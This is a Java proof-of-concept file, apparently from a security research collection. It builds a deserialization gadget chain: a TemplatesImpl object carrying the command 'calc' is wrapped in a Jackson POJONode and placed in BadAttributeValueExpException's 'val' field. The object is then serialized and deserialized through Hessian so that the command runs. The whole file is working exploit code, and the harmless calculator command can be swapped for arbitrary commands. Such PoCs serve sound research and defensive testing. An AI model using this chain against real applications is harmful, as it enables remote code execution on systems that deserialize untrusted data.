package com.javasec.pocs.jackson;

import com.fasterxml.jackson.databind.node.POJONode;
import com.javasec.utils.SerializeUtils;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;

public class BATemplatesChain {
    public static void main(String[] args) throws Exception {
        SerializeUtils.OverideJackson();
        Templates templates = SerializeUtils.getTemplate("calc");
        POJONode jsonNodes = new POJONode(templates);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("anything");
        SerializeUtils.setFieldValue(badAttributeValueExpException,"val",jsonNodes);
        //SerializeUtils.base64deserial(SerializeUtils.base64serial(badAttributeValueExpException));
        SerializeUtils.HessianDeserial(SerializeUtils.HessianTostringSerial(badAttributeValueExpException));

    }
}
